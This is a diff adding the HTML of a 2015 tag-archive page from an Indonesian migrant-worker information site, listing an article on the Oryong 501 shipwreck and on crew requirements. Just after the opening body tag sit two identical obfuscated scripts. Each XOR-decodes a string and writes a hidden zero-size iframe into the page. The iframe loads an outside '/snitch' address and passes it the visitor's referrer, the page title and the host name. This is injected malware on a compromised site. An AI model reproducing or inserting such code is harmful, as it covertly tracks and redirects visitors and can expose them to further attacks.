@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<!--[if IE 7]>
+<html class="ie ie7" lang="id-ID"
+	itemscope 
+	itemtype="http://schema.org/WebSite" 
+	prefix="og: http://ogp.me/ns#" >
+<![endif]-->
+<!--[if IE 8]>
+<html class="ie ie8" lang="id-ID"
+	itemscope 
+	itemtype="http://schema.org/WebSite" 
+	prefix="og: http://ogp.me/ns#" >
+<![endif]-->
+<!--[if !(IE 7) & !(IE 8)]><!-->
+<html lang="id-ID"
+	itemscope 
+	itemtype="http://schema.org/WebSite" 
+	prefix="og: http://ogp.me/ns#" >
+<!--<![endif]-->
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>korban Kapal Oryang 501 Korea | Pusat Sumber Daya Buruh Migran</title>
+	<link rel="profile" href="http://gmpg.org/xfn/11">
+	<link rel="pingback" href="http://buruhmigran.or.id/xmlrpc.php">
+	<!--[if lt IE 9]>
+	<script src="http://buruhmigran.or.id/wp-content/themes/buruhmigran/js/html5shiv.js"></script>
+	<![endif]-->
+	
+<!-- All in One SEO Pack 2.2.7.2 by Michael Torbert of Semper Fi Web Design[-1,-1] -->
+<meta name="keywords" itemprop="keywords" content="bnp2tki,cara menjadi abk,kapal oryong 501,kementerian kelautan dan perikanan,kementerian perhubungan,korban kapal oryang 501 korea,syarat menjadi abk resmi,headline,kajian" />
+
+<link rel="canonical" href="http://buruhmigran.or.id/tag/korban-kapal-oryang-501-korea/" />
+<!-- /all in one seo pack -->
+<link rel="alternate" type="application/rss+xml" title="Pusat Sumber Daya Buruh Migran &raquo; Feed" href="http://buruhmigran.or.id/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Pusat Sumber Daya Buruh Migran &raquo; Umpan Komentar" href="http://buruhmigran.or.id/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Pusat Sumber Daya Buruh Migran &raquo; korban Kapal Oryang 501 Korea Umpan Tag" href="http://buruhmigran.or.id/tag/korban-kapal-oryang-501-korea/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"http:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/buruhmigran.or.id\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.2.2"}};
+			!function(a,b,c){function d(a){var c=b.createElement("canvas"),d=c.getContext&&c.getContext("2d");return d&&d.fillText?(d.textBaseline="top",d.font="600 32px Arial","flag"===a?(d.fillText(String.fromCharCode(55356,56812,55356,56807),0,0),c.toDataURL().length>3e3):(d.fillText(String.fromCharCode(55357,56835),0,0),0!==d.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='ultimate-tables-style-css'  href='http://buruhmigran.or.id/wp-content/plugins/ultimate-tables/css/ultimate-tables.css?ver=4.2.2' type='text/css' media='all' />
+<link rel='stylesheet' id='ultimate-datatables-style-css'  href='http://buruhmigran.or.id/wp-content/plugins/ultimate-tables/css/jquery.dataTables.css?ver=4.2.2' type='text/css' media='all' />
+<link rel='stylesheet' id='toc-screen-css'  href='http://buruhmigran.or.id/wp-content/plugins/table-of-contents-plus/screen.min.css?ver=1509' type='text/css' media='all' />
+<link rel='stylesheet' id='font-css'  href='http://fonts.googleapis.com/css?family=Roboto%3A400%2C300%2C500%2C700%2C300italic%2C400italic%2C500italic' type='text/css' media='all' />
+<link rel='stylesheet' id='bootstrap-min-css'  href='http://buruhmigran.or.id/wp-content/themes/buruhmigran/css/bootstrap.min.css?ver=3.1.1' type='text/css' media='all' />
+<link rel='stylesheet' id='dashicons-css'  href='http://buruhmigran.or.id/wp-includes/css/dashicons.min.css?ver=4.2.2' type='text/css' media='all' />
+<link rel='stylesheet' id='reset-css'  href='http://buruhmigran.or.id/wp-content/themes/buruhmigran/css/reset.css?ver=1.0.0' type='text/css' media='all' />
+<link rel='stylesheet' id='override-css'  href='http://buruhmigran.or.id/wp-content/themes/buruhmigran/css/override.css?ver=1.0.0' type='text/css' media='all' />
+<link rel='stylesheet' id='style-css'  href='http://buruhmigran.or.id/wp-content/themes/buruhmigran/style.css?ver=1.0.0' type='text/css' media='all' />
+<link rel='stylesheet' id='jetpack_css-css'  href='http://buruhmigran.or.id/wp-content/plugins/jetpack/css/jetpack.css?ver=3.6.1' type='text/css' media='all' />
+<script type='text/javascript' src='http://buruhmigran.or.id/wp-includes/js/jquery/jquery.js?ver=1.11.2'></script>
+<script type='text/javascript' src='http://buruhmigran.or.id/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://buruhmigran.or.id/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://buruhmigran.or.id/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 4.2.2" />
+<!-- <meta name="NextGEN" version="2.1.0" /> -->
+
+<meta http-equiv="Content-Language" content="id-ID" />
+<style type="text/css" media="screen">
+.ppqtrans_flag span{display:none}
+.ppqtrans_flag{height:12px;width:18px;display:block}
+.ppqtrans_flag_and_text{padding-left:20px}
+.ppqtrans_flag_and_text{padding-left:20px}
+.ppqtrans_flag_id { background:url(http://buruhmigran.or.id/wp-content/plugins/qtranslate-xp/flags/id.png) no-repeat }
+.ppqtrans_flag_en { background:url(http://buruhmigran.or.id/wp-content/plugins/qtranslate-xp/flags/gb.png) no-repeat }
+</style>
+<link hreflang="en" href="http://buruhmigran.or.id/en/tag/korban-kapal-oryang-501-korea/" rel="alternate" />
+<style type='text/css'>img#wpstats{display:none}</style></head>
+<body class="archive tag tag-korban-kapal-oryang-501-korea tag-3252">
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<!-- Start : Container -->
+<div id="bm-container" class="container-fluid">
+
+<!-- Start : Top Row -->
+<div class="row" id="top-row">
+	<div class="container">
+		<div class="row">
+			<div class="col-xs-6" id="left-top-row">+62274 372378 | redaksi[at]buruhmigran.or.id | Twitter: @infoburuhmigran </div>
+			<div class="col-xs-6" id="right-top-row"></div>
+		</div>
+	</div>
+</div>
+<!-- End : Top Row -->
+
+<!-- Start : Header Row -->
+<header class="row" id="header-row">
+	<div class="container">
+		<div class="row header-group">
+			<div class="col-xs-7" id="left-header-row">
+				<a href="" id="site-logo">
+					<img src="http://buruhmigran.or.id/wp-content/uploads/2015/03/Logo-PSDBM_web.png" />
+				</a>
+				<h1 id="site-title">
+					<a href="http://buruhmigran.or.id/" rel="home">PUSAT SUMBER DAYA BURUH MIGRAN</a>
+					<small id="site-description">Rujukan Informasi Tenaga Kerja Indonesia ( TKI ) &#8211; Saling Belajar, Berbagi, dan Melindungi</small>
+				</h1>
+			</div>
+			<div class="col-xs-5" id="right-header-row">
+				<div class="search-box"><form role="search" method="get" class="search-form input-group col-xs-7 pull-right" action="http://buruhmigran.or.id/">
+	<input type="search" class="search-field form-control" placeholder="Search …" value="" name="s" title="Search for: " />
+	<span class="input-group-btn">
+		<button type="submit" class="search-submit btn btn-primary" value="Cari">
+			<i class="dashicons dashicons-search"></i>
+		</button>
+	</span>
+</form></div>
+				<div class="header-menu"><nav class="navbar"><ul id="menu-menu-atas" class="nav navbar-nav navbar-right"><li id="menu-item-4028" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4028"><a href="http://buruhmigran.or.id/donasi/">Donasi</a></li>
+<li id="menu-item-4029" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4029"><a href="http://buruhmigran.or.id/tentang-kami/">Tentang Kami</a></li>
+<li id="menu-item-4030" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4030"><a href="http://buruhmigran.or.id/hubungi-kami/">Kontak Kami</a></li>
+</ul></nav></div>
+			</div>
+		</div>
+	</div>
+</header>
+<!-- End : Header Row -->
+
+<!-- Start : Navbar Row -->
+<div class="row" id="navbar-row">
+	<div class="container"><nav class="navbar"><ul id="menu-menu-utama" class="nav navbar-nav navbar-none"><li id="menu-item-4091" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-4091"><a href="http://buruhmigran.or.id/">Beranda</a></li>
+<li id="menu-item-4021" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children dropdown menu-item-4021"><a href="#" class="dropdown-toggle" data-toggle="dropdown">Berita <b class="caret"></b></a>
+<ul class="dropdown-menu ">
+	<li id="menu-item-4097" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4097"><a href="http://buruhmigran.or.id/topik/kisah-2/kisah/">Tragedi</a></li>
+	<li id="menu-item-4094" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4094"><a href="http://buruhmigran.or.id/topik/hukum/">Hukum</a></li>
+	<li id="menu-item-4096" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4096"><a href="http://buruhmigran.or.id/topik/produk/">Produk</a></li>
+</ul>
+</li>
+<li id="menu-item-13637" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children dropdown menu-item-13637"><a href="#" class="dropdown-toggle" data-toggle="dropdown">Dokumentasi <b class="caret"></b></a>
+<ul class="dropdown-menu ">
+	<li id="menu-item-4098" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4098"><a href="http://buruhmigran.or.id/topik/foto/">Foto</a></li>
+	<li id="menu-item-4023" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4023"><a href="http://buruhmigran.or.id/topik/audio/">Audio</a></li>
+	<li id="menu-item-12307" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-12307"><a href="http://buruhmigran.or.id/topik/video/">Video</a></li>
+</ul>
+</li>
+<li id="menu-item-13638" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children dropdown menu-item-13638"><a href="#" class="dropdown-toggle" data-toggle="dropdown">Info TKI <b class="caret"></b></a>
+<ul class="dropdown-menu ">
+	<li id="menu-item-13676" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13676"><a href="http://buruhmigran.or.id/pra-penempatan/">Pra Penempatan</a></li>
+	<li id="menu-item-13681" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13681"><a href="http://buruhmigran.or.id/masa-penempatan/">Masa Penempatan</a></li>
+	<li id="menu-item-13684" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13684"><a href="http://buruhmigran.or.id/purna-penempatan/">Purna Penempatan</a></li>
+	<li id="menu-item-13792" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13792"><a title="Hak-Hak TKI " href="http://buruhmigran.or.id/hak-dan-kewajiban-tki/">Hak-Hak TKI</a></li>
+	<li id="menu-item-13789" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-13789"><a href="http://buruhmigran.or.id/topik/panduan-3/">Panduan</a></li>
+	<li id="menu-item-13757" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13757"><a title="Animasi TKI" href="http://buruhmigran.or.id/bahan-belajar/">Animasi TKI</a></li>
+</ul>
+</li>
+<li id="menu-item-13769" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children dropdown menu-item-13769"><a href="#" class="dropdown-toggle" data-toggle="dropdown">Info Negara Tujuan <b class="caret"></b></a>
+<ul class="dropdown-menu ">
+	<li id="menu-item-13770" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-13770"><a href="http://buruhmigran.or.id/topik/info-negara-tujuan/arab-saudi/">Arab Saudi</a></li>
+	<li id="menu-item-13771" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-13771"><a href="http://buruhmigran.or.id/topik/info-negara-tujuan/hong-kong/">Hong Kong</a></li>
+	<li id="menu-item-13772" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-13772"><a href="http://buruhmigran.or.id/topik/info-negara-tujuan/korea-selatan/">Korea Selatan</a></li>
+	<li id="menu-item-13775" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-13775"><a href="http://buruhmigran.or.id/topik/info-negara-tujuan/taiwan/">Taiwan</a></li>
+	<li id="menu-item-13773" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-13773"><a href="http://buruhmigran.or.id/topik/info-negara-tujuan/malaysia/">Malaysia</a></li>
+	<li id="menu-item-13774" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-13774"><a href="http://buruhmigran.or.id/topik/info-negara-tujuan/singapura/">Singapura</a></li>
+</ul>
+</li>
+<li id="menu-item-13640" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children dropdown menu-item-13640"><a href="#" class="dropdown-toggle" data-toggle="dropdown">Kontak Penting <b class="caret"></b></a>
+<ul class="dropdown-menu ">
+	<li id="menu-item-13787" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children dropdown menu-item-13787"><a href="#" class="dropdown-toggle" data-toggle="dropdown">Dalam Negeri <b class="caret"></b></a>
+	<ul class="dropdown-menu ">
+		<li id="menu-item-13729" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13729"><a href="http://buruhmigran.or.id/daftar-bp3tki/">Daftar BP3TKI</a></li>
+		<li id="menu-item-13734" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13734"><a title="Dinas Tenaga Kerja" href="http://buruhmigran.or.id/daftar-dinas-tenaga-kerja/">Daftar Dinas Tenaga Kerja</a></li>
+	</ul>
+</li>
+	<li id="menu-item-13788" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children dropdown menu-item-13788"><a href="#" class="dropdown-toggle" data-toggle="dropdown">Luar Negeri <b class="caret"></b></a>
+	<ul class="dropdown-menu ">
+		<li id="menu-item-13731" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13731"><a title="Daftar KBRI" href="http://buruhmigran.or.id/daftar-kedutaan-besar-republik-indonesia-kbri-luar-negeri/">Daftar KBRI</a></li>
+	</ul>
+</li>
+</ul>
+</li>
+<li id="menu-item-13791" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-13791"><a href="http://pustaka.buruhmigran.or.id">Perpustakaan</a></li>
+<li id="menu-item-13927" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-13927"><a href="http://buruhmigran.or.id/topik/infografis/">Infografis</a></li>
+</ul></nav></div>
+</div>
+<!-- End : Navbar Row -->
+
+<!-- Start : Main Row -->
+<div class="row" id="main-row">
+	<div class="container"><div class="row">
+		<div class="col-xs-8 mainbar" id="mainbar">
+			<header class="header">
+				<h1 class="page-title">
+					Arsip				</h1>
+			</header>
+			<div class="xrow" id="archives">	<article id="post-12499" class="post-12499 post type-post status-publish format-standard hentry category-headline category-kajian tag-bnp2tki tag-cara-menjadi-abk tag-kapal-oryong-501 tag-kementerian-kelautan-dan-perikanan tag-kementerian-perhubungan tag-korban-kapal-oryang-501-korea tag-syarat-menjadi-abk-resmi">
+		<div class="row">
+			<div class="col-xs-3">
+				<a href="http://buruhmigran.or.id/2014/12/04/syarat-menjadi-abk-resmi/" rel="bookmark" title="Permanent Link to: Syarat Menjadi ABK Resmi">					<div class="entry-thumb" style="background-image:url('http://buruhmigran.or.id/wp-content/uploads/2014/12/ABK-150x150.png');"></div>
+				</a>
+			</div>
+			<div class="col-xs-9">
+				<div class="entry-meta">Desember 4, 2014 by <a href="http://buruhmigran.or.id/author/yuna/" title="Pos-pos oleh Pratina Ikhtiyarini" rel="author">Pratina Ikhtiyarini</a></div>
+				<h2 class="entry-title">
+					<a href="http://buruhmigran.or.id/2014/12/04/syarat-menjadi-abk-resmi/" rel="bookmark" title="Permanent Link to: Syarat Menjadi ABK Resmi">Syarat Menjadi ABK Resmi</a>
+				</h2>
+				<div class="entry-summary">
+					<p>Kabar duka kembali merundung buruh migran. Kapal Oryong 501 asal Korea Selatan yang membawa 35 buruh migran Anak Buah Kapal (ABK) dikabarkan telah tenggelam di perairan Bering Lepas Pantai Timur Jauh Rusia. Berita terakhir menyebutkan... <a href="http://buruhmigran.or.id/2014/12/04/syarat-menjadi-abk-resmi/" class="readmore">Baca selanjutnya</a></p>
+				</div>
+			</div>
+		</div>
+</article>			</div>
+		</div>
+		<div class="col-xs-4 sidebar" id="sidebar">
+			<aside id="widget_buruhmigran_tabs-3" class="widget widget_buruhmigran_tabs">	<ul class="nav nav-tabs">
+							<li class="active"><a href="#one" data-toggle="tab" rel="tooltip" title="Berita Terkini">
+			<i class="dashicons dashicons-shield-alt"></i></a></li>
+									<li><a href="#two" data-toggle="tab" rel="tooltip" title="Headline">
+			<i class="dashicons dashicons-welcome-view-site"></i></a></li>
+																			</ul>
+	<div class="tab-content">
+							<div class="tab-pane fade active in" id="one">
+			<h3 class="widget-title widget-title-tab-article"><span class="dashicons dashicons-shield-alt pull-right"></span>Berita Terkini</h3><ul><li><span class="datetime">1 October 2015 by <a href="https://www.facebook.com/bobi.AM" title="Kunjungi situs web Bobi Alwy" rel="author external">Bobi Alwy</a></span><a href="http://buruhmigran.or.id/2015/10/01/agusdin-ada-surat-perjanjian-penempatan-tki-g-to-g/">Agusdin : Ada Surat Perjanjian Penempatan TKI G to G</a></li><li><span class="datetime">28 September 2015 by <a href="https://www.facebook.com/bobi.AM" title="Kunjungi situs web Bobi Alwy" rel="author external">Bobi Alwy</a></span><a href="http://buruhmigran.or.id/2015/09/28/standar-perjanjian-kerja-yang-memperbudak-buruh-migran/">Standar Perjanjian Kerja yang Memperbudak Buruh Migran</a></li><li><span class="datetime">18 September 2015 by admin</span><a href="http://buruhmigran.or.id/2015/09/18/instrumen-perlindungan-buruh-migran-di-asean-harus-sesuai-konvensi-ilo-1990/">Instrumen Perlindungan Buruh Migran di ASEAN Harus Sesuai Konvensi ILO 1990</a></li><li><span class="datetime">28 August 2015 by KRT. Ridwan Wahyudi</span><a href="http://buruhmigran.or.id/2015/08/28/hikayat-pendatang-haram/">Hikayat Pendatang Haram</a></li><li><span class="datetime">26 August 2015 by admin</span><a href="http://buruhmigran.or.id/2015/08/26/press-release-indonesia-darurat-trafficking-tuntaskan-kasus-tki-abk/">Press Release:  Indonesia Darurat Trafficking, Tuntaskan Kasus TKI ABK</a></li><li><span class="datetime">6 August 2015 by <a href="https://www.facebook.com/bobi.AM" title="Kunjungi situs web Bobi Alwy" rel="author external">Bobi Alwy</a></span><a href="http://buruhmigran.or.id/2015/08/06/asfinawati-bantuan-hukum-untuk-tki-sebaiknya-dimulai-sejak-pra-penempatan/">Asfinawati : Bantuan Hukum untuk TKI Sebaiknya Dimulai Sejak Pra Penempatan</a></li></ul><div class="read-more"><a href="http://buruhmigran.or.id/topik/hukum/">Baca Berita Terkini Lainnya &rarr;</a></div>		</div>
+									<div class="tab-pane fade" id="two">
+			<h3 class="widget-title widget-title-tab-article"><span class="dashicons dashicons-welcome-view-site pull-right"></span>Headline</h3><ul><li><span class="datetime">2 October 2015 by admin</span><a href="http://buruhmigran.or.id/2015/10/02/beberapa-masukan-untuk-program-re-hiring-bmi-di-malaysia/">Beberapa Masukan untuk Program Re-Hiring BMI di Malaysia</a></li><li><span class="datetime">1 October 2015 by <a href="https://www.facebook.com/bobi.AM" title="Kunjungi situs web Bobi Alwy" rel="author external">Bobi Alwy</a></span><a href="http://buruhmigran.or.id/2015/10/01/agusdin-ada-surat-perjanjian-penempatan-tki-g-to-g/">Agusdin : Ada Surat Perjanjian Penempatan TKI G to G</a></li><li><span class="datetime">30 September 2015 by admin</span><a href="http://buruhmigran.or.id/2015/09/30/gaji-buruh-migran-prt-hong-kong-naik/">Gaji Buruh Migran PRT Hong Kong Naik</a></li><li><span class="datetime">29 September 2015 by admin</span><a href="http://buruhmigran.or.id/2015/09/29/reintegrasi-bukan-hanya-persoalan-ekonomi/">Reintegrasi Bukan Hanya Persoalan Ekonomi</a></li><li><span class="datetime">28 September 2015 by <a href="https://www.facebook.com/bobi.AM" title="Kunjungi situs web Bobi Alwy" rel="author external">Bobi Alwy</a></span><a href="http://buruhmigran.or.id/2015/09/28/standar-perjanjian-kerja-yang-memperbudak-buruh-migran/">Standar Perjanjian Kerja yang Memperbudak Buruh Migran</a></li><li><span class="datetime">24 September 2015 by admin</span><a href="http://buruhmigran.or.id/2015/09/24/panduan-menghitung-pajak-buruh-migran-di-taiwan/">Panduan Menghitung Pajak Buruh Migran di Taiwan</a></li></ul><div class="read-more"><a href="http://buruhmigran.or.id/topik/headline/">Baca  Lainnya &rarr;</a></div>		</div>
+																			</div>
+		</aside><aside id="widget_buruhmigran_form_contributor-3" class="widget widget_buruhmigran_form_contributor"><h3 class="widget-title"><span class="dashicons dashicons-groups"></span>Login Kontributor</h3><form action="" method="post" class="login form-horizontal"><p class="widget-content">For those of you who joined as a contributor in this website, please login to contribute.</p>
+						<div class="input-group">
+				<span class="input-group-addon">
+					<span class="dashicons dashicons-admin-users"></span>
+				</span>
+				<input type="text" class="form-control" placeholder="Username" name="username" required />
+			</div>
+			<div class="input-group">
+				<span class="input-group-addon">
+					<span class="dashicons dashicons-admin-network"></span>
+				</span>
+				<input type="password" class="form-control" placeholder="Password" name="password" required />
+			</div>
+			<input type="hidden" name="login_nonce" value="808b855d95">
+			<button class="btn btn-primary" type="submit" name="submit-login" value="login">SIGN-IN NOW</button>
+			<p class="widget-content">Or Register now if you do not have an account as a contributor to contribute articles relating to migrant workers.</p>
+			<a class="btn btn-warning">REGISTER NOW</a></form></aside><aside id="text-11" class="widget widget_text"><h3 class="widget-title">Mata Uang</h3>			<div class="textwidget"><!--Makmu-->
+<div style="width:295px;border:1px solid #55A516;"><div style="text-align:center;background-color:#55A516;width:100%;font-size:13px;font-weight:bold;height:18px;padding-top:2px;"><a href="https://www.exchangeratewidget.com/" style="color:#FFFFFF;text-decoration:none;">Periksa Kurs</a></div><script type="text/javascript" src="//www.exchangeratewidget.com/converter.php?l=en&f=USD&t=IDR&a=1&d=F0F0F0&n=FFFFFF&o=000000&v=1"></script></div>
+<!-- End of Currency Converter Script --></div>
+		</aside><aside id="widget_buruhmigran_social-3" class="widget widget_buruhmigran_social">	<div class="row">
+		<div class="col-xs-3">
+			<a href="http://twitter.com/infoburuhmigran"><img src="http://buruhmigran.or.id/wp-content/themes/buruhmigran/images/buruhmigran_twitter.jpg"></a>
+		</div>
+		<div class="col-xs-3">
+			<a href="http://facebook.com/buruhmigranindonesia"><img src="http://buruhmigran.or.id/wp-content/themes/buruhmigran/images/buruhmigran_facebook.jpg"></a>
+		</div>
+		<div class="col-xs-3">
+			<a href="http://kaskus.co.id/profile/buruhmigran"><img src="http://buruhmigran.or.id/wp-content/themes/buruhmigran/images/buruhmigran_kaskus.jpg"></a>
+		</div>
+		<div class="col-xs-3">
+			<a href="skype:buruhmigran?call"><img src="http://buruhmigran.or.id/wp-content/themes/buruhmigran/images/buruhmigran_skype.jpg"></a>
+		</div>
+	</div>
+		</aside>		</div>
+	</div></div>
+</div>
+
+<!-- Start : Footer Row -->
+<div class="row" id="footer-row">
+	<footer class="container">
+		<div class="col-xs-7" id="footer-left"><img src="http://buruhmigran.or.id/wp-content/uploads/2015/04/psdbm_white.png" />
+	<div class="footer-content" id="footer-content-left">
+		<span id="web-link">www.buruhmigran.or.id</span>		<h4 id="web-slogan">Saling Belajar, Berbagi, Melindungi</h4>		<p id="web-text">redaksi@buruhmigran.or.id | Situs ini dikelola oleh Infest Yogyakarta dan 14 Pusat Teknologi Komunitas Rumah Internet untuk TKI (PTK Mahnettik)</p>		<span id="web-copyright">All Rights Reserved &copy; 2014 <a href="http://buruhmigran.or.id">Pusat Sumber Daya Buruh Migran</a>. </span>
+	</div></div>
+		<div class="col-xs-2">
+						<div id="footer-1" class="footer-1 widget-area" role="complementary">
+				<aside id="nav_menu-4" class="widget widget_nav_menu"><div class="menu-menu-bawah-1-container"><ul id="menu-menu-bawah-1" class="menu"><li id="menu-item-4038" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4038"><a href="http://buruhmigran.or.id/ketentuan/">Ketentuan</a></li>
+<li id="menu-item-4037" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4037"><a href="http://buruhmigran.or.id/topik/faq/">Faq</a></li>
+<li id="menu-item-4039" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4039"><a href="http://buruhmigran.or.id/jaringan/">Mitra Kerja</a></li>
+<li id="menu-item-4041" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4041"><a href="http://buruhmigran.or.id/about/">Pegiat</a></li>
+<li id="menu-item-4040" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4040"><a href="http://buruhmigran.or.id/hubungi-kami/">Kontak Kami</a></li>
+<li id="menu-item-5811" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5811"><a href="http://buruhmigran.or.id/kontributor/">Kontributor</a></li>
+<li id="menu-item-5810" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5810"><a href="http://buruhmigran.or.id/donasi/">Donasi</a></li>
+</ul></div></aside>			</div><!-- #primary-sidebar -->
+					</div>
+		<div class="col-xs-3">
+						<div id="footer-1" class="footer-2 widget-area" role="complementary">
+				<aside id="nav_menu-5" class="widget widget_nav_menu"><div class="menu-menu-bawah-2-container"><ul id="menu-menu-bawah-2" class="menu"><li id="menu-item-5812" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-5812"><a href="http://buruhmigran.or.id/topik/berita-2/">Berita</a></li>
+<li id="menu-item-5813" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-5813"><a href="http://buruhmigran.or.id/topik/buletin/">Buletin</a></li>
